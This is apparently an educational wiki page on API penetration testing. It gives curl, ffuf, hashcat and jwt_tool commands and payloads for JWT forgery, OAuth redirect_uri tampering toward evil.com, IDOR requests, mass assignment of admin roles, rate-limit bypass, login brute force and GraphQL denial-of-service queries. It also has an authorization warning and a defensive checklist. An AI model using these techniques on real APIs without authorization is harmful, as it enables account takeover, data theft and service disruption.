---
title: "API Security Testing"
description: "API enumeration and discovery, JWT and OAuth authentication testing, BOLA and IDOR methodology, GraphQL security testing, mass assignment, rate limiting bypass, and the OWASP API Security Top 10"
tags: [api-security, testing, jwt, graphql, owasp-api]
difficulty: advanced
prerequisites: [cybersecurity/web-app-pentesting, cybersecurity/networking-fundamentals]
lastReviewed: "2026-03-20"
---

# API Security Testing

APIs are the backbone of modern applications. Every mobile app, single-page application, microservice, and third-party integration communicates through APIs. Unlike traditional web applications with rendered HTML, APIs expose raw data and business logic directly — making them high-value targets and frequently the weakest link in an organization's security posture.

According to Gartner, APIs are the most frequent attack vector for web application data breaches. This page covers the methodology, tools, and techniques for systematically testing REST, GraphQL, and gRPC APIs for security vulnerabilities.

**Related**: [Cybersecurity Overview](/cybersecurity/) | [Web App Pentesting](/cybersecurity/web-app-pentesting) | [Mobile Security](/cybersecurity/mobile-security) | [Secure Coding](/cybersecurity/secure-coding)

::: danger Authorization Required
Only test APIs you own or have explicit written authorization to test. API testing can cause data modification, account lockout, and service disruption. Use dedicated test environments or bug bounty programs.
:::

---

## API Security Testing Methodology

```mermaid
graph TB
    subgraph "Phase 1: Reconnaissance"
        R1["API Discovery<br/>Documentation, traffic analysis"]
        R2["Endpoint Enumeration<br/>Fuzzing, wordlists"]
        R3["Schema Analysis<br/>OpenAPI, GraphQL introspection"]
    end

    subgraph "Phase 2: Authentication Testing"
        A1["Token Analysis<br/>JWT, OAuth, API keys"]
        A2["Auth Bypass<br/>Missing checks, forged tokens"]
        A3["Session Management<br/>Expiry, revocation, rotation"]
    end

    subgraph "Phase 3: Authorization Testing"
        Z1["BOLA / IDOR<br/>Horizontal privilege escalation"]
        Z2["BFLA<br/>Vertical privilege escalation"]
        Z3["Mass Assignment<br/>Parameter pollution"]
    end

    subgraph "Phase 4: Input Testing"
        I1["Injection<br/>SQLi, NoSQLi, command injection"]
        I2["Business Logic<br/>Race conditions, workflow abuse"]
        I3["Rate Limiting<br/>Brute force, DoS"]
    end

    R1 --> R2 --> R3
    R3 --> A1 --> A2 --> A3
    A3 --> Z1 --> Z2 --> Z3
    Z3 --> I1 --> I2 --> I3

    style R1 fill:#2563eb,color:#fff
    style A1 fill:#ca8a04,color:#fff
    style Z1 fill:#dc2626,color:#fff
    style I1 fill:#7c3aed,color:#fff
```

---

## API Discovery and Enumeration

### Finding APIs

```bash
# Check common documentation paths
curl -s https://target.com/api/docs
curl -s https://target.com/swagger.json
curl -s https://target.com/swagger/v1/swagger.json
curl -s https://target.com/openapi.json
curl -s https://target.com/api-docs
curl -s https://target.com/v1/api-docs
curl -s https://target.com/v2/api-docs
curl -s https://target.com/.well-known/openapi.json
curl -s https://target.com/graphql  # GraphQL endpoint

# Wayback Machine — find historical API endpoints
echo "target.com" | gau | grep -i "api\|graphql\|v1\|v2\|rest"

# JavaScript file analysis — extract API endpoints
# Download all JS files and search for fetch/axios calls
echo "target.com" | gau | grep "\.js$" | sort -u > js_files.txt
cat js_files.txt | while read url; do
    curl -s "$url" | grep -oE "(https?://[a-zA-Z0-9./?=_-]*api[a-zA-Z0-9./?=_-]*)" >> api_endpoints.txt
done

# Content discovery with ffuf
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,204,301,302,401,403
ffuf -u https://target.com/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -mc 200,201,204,301,302,401,403

# Arjun — discover hidden parameters
arjun -u https://target.com/api/v1/users -m GET
arjun -u https://target.com/api/v1/users -m POST --json
```

### API Documentation Analysis

| Source | What to Look For |
|--------|-----------------|
| **Swagger/OpenAPI** | All endpoints, parameters, auth requirements, data models |
| **Postman Collections** | Pre-built requests, environment variables, auth tokens |
| **GraphQL Schema** | Types, queries, mutations, subscriptions |
| **Source Code (JS)** | Fetch calls, axios instances, API base URLs |
| **Mobile App** | Decompiled API calls, hardcoded endpoints |
| **Browser DevTools** | Network tab — all API calls during normal usage |

---

## Authentication Testing

### JWT (JSON Web Token) Testing

JWTs are the most common API authentication mechanism. They are also frequently misconfigured.

```bash
# Decode JWT (base64) — does NOT require the secret
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | cut -d'.' -f2 | base64 -d 2>/dev/null

# JWT structure:
# Header: {"alg": "HS256", "typ": "JWT"}
# Payload: {"sub": "1234567890", "name": "John Doe", "iat": 1516239022}
# Signature: HMAC-SHA256(base64url(header) + "." + base64url(payload), secret)
```

### JWT Attack Vectors

```mermaid
graph TB
    subgraph "JWT Attacks"
        N["Algorithm None<br/>Remove signature"]
        A["Algorithm Confusion<br/>RS256 to HS256"]
        W["Weak Secret<br/>Brute force HMAC key"]
        KID["KID Injection<br/>Key ID header manipulation"]
        JKU["JKU/X5U Spoofing<br/>Point to attacker's key"]
        EXP["Expired Token<br/>Server does not check expiry"]
    end

    N -->|"Trivial if accepted"| A
    A -->|"Use public key as HMAC secret"| W
    W -->|"hashcat -m 16500"| KID

    style N fill:#dc2626,color:#fff
    style A fill:#dc2626,color:#fff
    style W fill:#ca8a04,color:#fff
```

```bash
# Attack 1: Algorithm None — set alg to "none", remove signature
# Header: {"alg": "none", "typ": "JWT"}
# Token becomes: base64(header).base64(payload).
# If the server accepts this, authentication is completely bypassed

# Attack 2: Brute force weak HMAC secret
# Use hashcat to crack JWT secret
hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt

# Attack 3: Algorithm confusion (RS256 to HS256)
# If server uses RS256 but accepts HS256, sign with public key as HMAC secret
# 1. Get server's public key
# 2. Change alg to HS256
# 3. Sign token with public key as HMAC secret

# jwt_tool — comprehensive JWT testing
python3 jwt_tool.py eyJ...TOKEN... -C -d /usr/share/wordlists/rockyou.txt  # Crack
python3 jwt_tool.py eyJ...TOKEN... -X a  # Algorithm none attack
python3 jwt_tool.py eyJ...TOKEN... -X k  # Key confusion attack
python3 jwt_tool.py eyJ...TOKEN... -T    # Tamper payload interactively
```

### OAuth 2.0 Testing

| Vulnerability | Description | Test |
|--------------|-------------|------|
| **Open Redirect** | `redirect_uri` not validated strictly | Change redirect_uri to attacker domain |
| **CSRF on OAuth** | Missing `state` parameter | Remove state, test cross-site login |
| **Token leakage** | Access token in URL fragment or referrer | Check browser history, referrer headers |
| **Scope escalation** | Request additional scopes | Modify scope parameter in auth request |
| **Client impersonation** | Weak `client_secret` or none required | Use leaked client_id with no secret |
| **Token reuse** | No audience/issuer validation | Use token from app A on app B |

```bash
# Test redirect_uri manipulation
# Original: redirect_uri=https://app.com/callback
# Test: redirect_uri=https://evil.com/steal
# Test: redirect_uri=https://app.com.evil.com/callback
# Test: redirect_uri=https://app.com/callback/../../../evil
# Test: redirect_uri=https://app.com/callback%0d%0aLocation:%20evil.com

# Test state parameter
# Remove state parameter entirely — if login still works, CSRF possible
```

---

## BOLA / IDOR Testing

Broken Object-Level Authorization (BOLA), also known as Insecure Direct Object Reference (IDOR), is the most common and impactful API vulnerability. It occurs when the API does not verify that the authenticated user has permission to access the requested resource.

```mermaid
sequenceDiagram
    participant U1 as User A (ID: 123)
    participant API as API Server
    participant U2 as User B (ID: 456)

    U1->>API: GET /api/v1/users/123/profile
    API->>U1: 200 OK — User A's profile

    Note over U1,API: BOLA Test: Change ID
    U1->>API: GET /api/v1/users/456/profile
    API->>U1: 200 OK — User B's profile (VULNERABILITY!)

    Note over API: Server did not check if<br/>User A owns resource 456
```

### BOLA Testing Methodology

```bash
# Step 1: Identify all endpoints that use object references
# Look for numeric IDs, UUIDs, filenames, or any identifier in the URL/body
# GET /api/v1/users/{id}
# GET /api/v1/orders/{order_id}
# GET /api/v1/documents/{doc_uuid}
# POST /api/v1/accounts/{account_id}/transfer

# Step 2: Create two test accounts (Account A and Account B)
# Authenticate as Account A
# Record all resource IDs associated with Account A

# Step 3: Using Account A's session, access Account B's resources
# Change IDs in URL path
curl -H "Authorization: Bearer TOKEN_A" https://api.target.com/api/v1/users/USER_B_ID

# Change IDs in query parameters
curl -H "Authorization: Bearer TOKEN_A" "https://api.target.com/api/v1/orders?user_id=USER_B_ID"

# Change IDs in request body
curl -X POST -H "Authorization: Bearer TOKEN_A" \
    -d '{"user_id": "USER_B_ID", "amount": 100}' \
    https://api.target.com/api/v1/transfer

# Step 4: Test with different HTTP methods
# A resource may allow GET but not check auth on PUT/DELETE
curl -X DELETE -H "Authorization: Bearer TOKEN_A" https://api.target.com/api/v1/users/USER_B_ID

# Step 5: Test ID formats
# Sequential integers: 123 -> 124, 125
# UUIDs: try UUID enumeration or leaked UUIDs
# Encoded IDs: decode base64/hex, modify, re-encode
```

::: tip BOLA Automation with Burp
Use Burp Suite's **Autorize** extension:
1. Configure two sessions (low-privilege and high-privilege)
2. Browse the application with the high-privilege session
3. Autorize automatically replays each request with the low-privilege session
4. Review which requests succeed — those are BOLA/IDOR vulnerabilities
:::

---

## Mass Assignment

Mass assignment occurs when an API binds user-supplied JSON directly to an internal object without filtering, allowing attackers to set fields they should not control.

```bash
# Normal user registration request
POST /api/v1/register
{
    "username": "newuser",
    "email": "user@example.com",
    "password": "secureP@ss"
}

# Mass assignment attack — add admin field
POST /api/v1/register
{
    "username": "newuser",
    "email": "user@example.com",
    "password": "secureP@ss",
    "role": "admin",
    "isAdmin": true,
    "is_verified": true,
    "credits": 99999
}

# Mass assignment on profile update
PUT /api/v1/users/123
{
    "name": "Normal Update",
    "email": "new@email.com",
    "role": "admin",
    "balance": 99999,
    "subscription_tier": "enterprise"
}
```

### How to Find Mass Assignment Fields

```bash
# 1. Read API documentation — find all model fields
# 2. Check responses — API often returns more fields than it accepts
# Compare: POST request (3 fields) vs GET response (10 fields)
# Try submitting the extra fields in the POST

# 3. Guess common field names
# role, is_admin, isAdmin, admin, type, user_type
# verified, is_verified, email_verified
# balance, credits, subscription, plan, tier
# internal, debug, test

# 4. Use Param Miner (Burp extension) to discover hidden parameters
```

---

## Rate Limiting Bypass

```bash
# Test if rate limiting exists
for i in $(seq 1 100); do
    curl -s -o /dev/null -w "%{http_code}\n" \
        -X POST https://target.com/api/v1/login \
        -d '{"user":"admin","pass":"wrong'$i'"}'
done

# Bypass techniques:

# 1. IP rotation (using X-Forwarded-For)
curl -H "X-Forwarded-For: 1.2.3.$RANDOM" https://target.com/api/v1/login

# 2. Change case of endpoint
# /api/v1/login vs /API/V1/LOGIN vs /Api/V1/Login

# 3. Add query parameters
# /api/v1/login?x=1 vs /api/v1/login?x=2

# 4. Use different HTTP methods
# POST /api/v1/login vs PUT /api/v1/login

# 5. Add path variations
# /api/v1/login vs /api/v1/login/ vs /api/v1/./login

# 6. Use different content types
# application/json vs application/x-www-form-urlencoded

# 7. Distribute across multiple API versions
# /api/v1/login vs /api/v2/login
```

---

## GraphQL Security Testing

GraphQL introduces unique attack vectors not present in REST APIs.

### GraphQL Reconnaissance

```bash
# Test for GraphQL endpoint
curl -s https://target.com/graphql -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}'

# Common GraphQL endpoints
# /graphql, /gql, /graphiql, /v1/graphql, /api/graphql

# Introspection query — dump entire schema
curl -s https://target.com/graphql -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"}' | jq .

# Full introspection query
curl -s https://target.com/graphql -H "Content-Type: application/json" \
    -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } } } fragment FullType on __Type { kind name fields(includeDeprecated: true) { name args { name type { ...TypeRef } } type { ...TypeRef } } } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name } } }"}'
```

### GraphQL Attack Vectors

```mermaid
graph TB
    subgraph "GraphQL Attacks"
        INT["Introspection<br/>Dump entire schema"]
        BATCH["Batching<br/>Multiple queries in one request"]
        NEST["Nested Queries<br/>Denial of Service"]
        AUTH2["Authorization<br/>Access unauthorized fields"]
        INJECT["Injection<br/>SQLi through variables"]
        INFO["Information Disclosure<br/>Verbose error messages"]
    end

    INT -->|"Find hidden types"| AUTH2
    BATCH -->|"Bypass rate limits"| INJECT
    NEST -->|"Exponential complexity"| INFO

    style INT fill:#ca8a04,color:#fff
    style NEST fill:#dc2626,color:#fff
    style AUTH2 fill:#dc2626,color:#fff
```

```graphql
# Nested query DoS — exponential resource consumption
# If User has posts, and Post has comments, and Comment has author...
query NestedDoS {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  title
                }
              }
            }
          }
        }
      }
    }
  }
}

# Batching attack — bypass rate limiting
# Send multiple queries in a single request
[
  {"query": "mutation { login(user:\"admin\",pass:\"password1\") { token } }"},
  {"query": "mutation { login(user:\"admin\",pass:\"password2\") { token } }"},
  {"query": "mutation { login(user:\"admin\",pass:\"password3\") { token } }"}
]

# Alias-based batching — same query with different params
query AliasBrute {
  a1: login(user: "admin", pass: "password1") { token }
  a2: login(user: "admin", pass: "password2") { token }
  a3: login(user: "admin", pass: "password3") { token }
}

# IDOR via GraphQL
query {
  user(id: "OTHER_USER_ID") {
    email
    address
    ssn
    creditCard
  }
}
```

### GraphQL Security Tools

| Tool | Purpose |
|------|---------|
| **GraphQL Voyager** | Visual schema exploration |
| **InQL (Burp Extension)** | GraphQL scanner, introspection, batch testing |
| **Clairvoyance** | Schema extraction when introspection is disabled |
| **graphql-cop** | GraphQL security auditing |
| **BatchQL** | Batch query and alias testing |

---

## OWASP API Security Top 10 (2023)

| # | Vulnerability | Description | Test |
|---|--------------|-------------|------|
| **API1** | Broken Object-Level Authorization | Access other users' resources via ID manipulation | Change IDs in every request |
| **API2** | Broken Authentication | Weak token generation, missing expiry, no rate limit | JWT analysis, brute force, token reuse |
| **API3** | Broken Object Property-Level Auth | Mass assignment, excessive data exposure | Add extra fields, check response data |
| **API4** | Unrestricted Resource Consumption | No rate limiting, no pagination limits | Request massive datasets, rapid-fire |
| **API5** | Broken Function-Level Authorization | Access admin endpoints as regular user | Swap roles, test admin paths |
| **API6** | Unrestricted Access to Sensitive Business Flows | No bot protection on critical operations | Automate purchase flows, registrations |
| **API7** | Server-Side Request Forgery (SSRF) | API fetches attacker-controlled URLs | Inject internal URLs in parameters |
| **API8** | Security Misconfiguration | Default configs, verbose errors, CORS | Check headers, error messages, methods |
| **API9** | Improper Inventory Management | Shadow APIs, deprecated versions still live | Enumerate old versions, documentation |
| **API10** | Unsafe Consumption of APIs | Trust third-party APIs without validation | Man-in-the-middle third-party calls |

---

## API Testing Tools

### Postman for Security Testing

```bash
# Import API collection and environment
# Set up two environments: attacker and victim

# Use Postman's pre-request scripts for token rotation
# Tests tab: assert status codes and response data

# Export collection and run with Newman (CLI)
newman run collection.json -e environment.json --reporters cli,json
```

### Automated API Fuzzing

```bash
# ffuf — API endpoint fuzzing
ffuf -u https://target.com/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    -H "Authorization: Bearer TOKEN" -mc 200,201,204,301,302,401,403,405

# ffuf — parameter fuzzing
ffuf -u "https://target.com/api/v1/users?FUZZ=test" \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -H "Authorization: Bearer TOKEN" -mc 200

# Nuclei — API vulnerability scanning
nuclei -u https://target.com -t /path/to/nuclei-templates/http/exposed-panels/
nuclei -l api_urls.txt -t /path/to/nuclei-templates/http/vulnerabilities/

# Arjun — hidden parameter discovery
arjun -u https://target.com/api/v1/search -m GET --json
arjun -u https://target.com/api/v1/users -m POST --json

# Kiterunner — API endpoint discovery
kr scan https://target.com -w /path/to/routes-large.kite
```

---

## API Security Checklist

| # | Category | Check | Priority |
|---|----------|-------|----------|
| 1 | **Authentication** | All endpoints require authentication | Critical |
| 2 | **Authentication** | Tokens expire and are properly validated | Critical |
| 3 | **Authentication** | No sensitive data in JWT payload | High |
| 4 | **Authorization** | Every endpoint checks object-level access | Critical |
| 5 | **Authorization** | Role-based checks on admin endpoints | Critical |
| 6 | **Input** | All inputs validated and sanitized server-side | High |
| 7 | **Input** | No SQL/NoSQL injection in parameters | Critical |
| 8 | **Rate Limiting** | Rate limits on auth, sensitive, and expensive endpoints | High |
| 9 | **Data** | API responses contain only necessary fields | Medium |
| 10 | **Data** | Pagination enforced with maximum page size | Medium |
| 11 | **Transport** | TLS 1.2+ enforced, no HTTP fallback | Critical |
| 12 | **Headers** | Proper CORS configuration (not wildcard) | High |
| 13 | **Errors** | No stack traces or internal details in errors | Medium |
| 14 | **Versioning** | Old API versions deprecated and removed | Medium |
| 15 | **Logging** | All API calls logged with user context | High |

::: warning API Security vs Web Security
APIs lack the browser's built-in protections (CORS enforcement, cookie flags, CSP). Every security control must be explicitly implemented server-side. Do not assume the client will follow rules — API consumers can be anything from browsers to custom scripts.
:::

---

## Further Reading

- [Web App Pentesting](/cybersecurity/web-app-pentesting) — Traditional web security testing
- [Mobile Security](/cybersecurity/mobile-security) — Mobile apps as API consumers
- [Secure Coding](/cybersecurity/secure-coding) — Building secure APIs
- [Bug Bounty Hunting](/cybersecurity/bug-bounty) — APIs are the top bug bounty target
- [OWASP Top 10](/security/owasp/) — Web application vulnerabilities
